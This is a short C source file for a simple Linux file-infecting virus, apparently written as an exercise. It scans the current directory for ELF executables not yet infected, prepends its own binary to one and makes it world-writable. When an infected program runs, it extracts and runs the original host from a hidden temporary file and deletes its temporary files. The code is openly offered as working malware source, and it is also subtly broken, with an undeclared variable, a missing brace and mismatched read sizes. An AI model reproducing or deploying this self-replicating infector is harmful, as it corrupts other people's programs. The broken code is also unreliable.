// Author : Mahima Singh
// Date : 01 December 2017

#include<stdio.h>
#include<stdlib.h>
#include<string.h>

// This function deletes the temporary files
void cleanUpTmpFolder(){

        system("find  -name '*038*' -delete");

}

// This function checks if the file provided as parameter is an infected file or not

int checkInfected (char filename[])
{

        char o[400],commandBuffer [400];
        char virus[] = "virus";
        snprintf(commandBuffer, sizeof commandBuffer, "%s%s%s", "strings ", filename, "| grep virus > .vir038.txt");
        FILE *f;
        system(&commandBuffer[0]);
        f = fopen(".vir038.txt", "r");
        fgets(o,399,f);


        if (strstr(o,virus) != NULL)
           return 1;
        else
           return 0;
}

// This function checks if the file provided is a  ELF executable file

int checkElf(char filename[])
{

        char commandBuffer[200],o[200];
        snprintf(commandBuffer, sizeof commandBuffer, "%s%s%s", "file ", filename, " > .elf038.txt");
        char elf[] = "ELF";
        FILE *f;
        system(&commandBuffer[0]);
        f = fopen(".elf038.txt", "r");
        fgets(o,199,f);


        if(strstr(o,elf) != NULL)
                return 1;
        else
                return 0;
}

int main(int argc, char* argv[])
    FILE *targetFile,*currentFile;
    char commandBuffer[500];
    char filename[100];
    system("ls > .file038.txt"); //list the files in current folder and put in /tmp/file038.txt
    fp = fopen(".file038.txt", "r"); //open the file in read mode
    while (!feof(fp)) //until end of file is reached
    {
        fgets(filename,300,fp); //reading contents of file in filename
        filename[strlen(filename)-1]='\0';
        if(checkElf(filename))
                {
                   if (checkInfected(filename) == 0)
                        {

                                snprintf(commandBuffer, sizeof commandBuffer, "%s%s%s%s%s%s", "cat virus ", filename, " > .myInfect038.tmp;mv .myInfect038.tmp ", filename, ";chmod 777 ", filename);
                                system(&commandBuffer[0]);
                                break;
                        }

                }
     }
        if(strstr(argv[0],"virus")!=NULL ){ //  This gets executed when virus is directly run
        printf("Hello! I am a simple virus!\n");
        cleanUpTmpFolder();
        exit(0);
        }

        FILE *infile = fopen(argv[0],"rb");
        FILE *virusFile = fopen("virus","rb");
        fseek (infile, 0L, SEEK_END);
        fseek(virusFile,0L, SEEK_END);
        int numBytes  = ftell(infile);
        int virusSize = ftell(virusFile);
        int hostSize =  numBytes - virusSize;
        fseek(infile,virusSize,SEEK_SET);
        unsigned char  *buffer = (char*) calloc(hostSize,sizeof(char));
        if(buffer == NULL) return 1;
        fread(buffer,sizeof(int),hostSize,infile);
        fclose(infile);
        FILE *ftemp = fopen(".target038","wb");
        fwrite(buffer,sizeof(int),hostSize,ftemp);
        system("chmod 777 .target038");
        fclose(ftemp);
        free(buffer);
        printf("Hello! I am a simple virus!\n");
	char sBuffer[400];
        if(argc == 1)
                snprintf(sBuffer, sizeof sBuffer, "./.target038");
        else if(argc == 2) 
                snprintf(sBuffer, sizeof sBuffer, "./.target038 %s", argv[1]);
        else if(argc == 3)
                snprintf(sBuffer, sizeof sBuffer, "./.target038 %s %s", argv[1], argv[2]);
        else
                snprintf(sBuffer, sizeof sBuffer, "./.target038 %s %s %s", argv[1], argv[2],argv[3]);
        system(sBuffer);
        cleanUpTmpFolder();
        return 0;
}

